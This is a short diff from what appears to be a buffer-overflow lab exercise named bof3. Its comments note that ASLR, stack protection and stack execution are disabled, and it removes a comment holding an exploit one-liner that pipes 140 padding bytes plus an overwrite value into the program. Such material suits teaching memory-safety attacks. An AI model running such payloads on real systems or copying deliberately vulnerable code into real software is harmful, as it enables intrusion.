@@ -11,7 +11,6 @@
 // ASLR OFF
 // STACK-PROTECTOR OFF
 // STACK-EXECUTION OFF
-// EXPLOIT $ (python -c "print 'x'*140+'a\x00\x00\x00'";cat) | ./bof3
 
 void vuln() {
     int innocent;
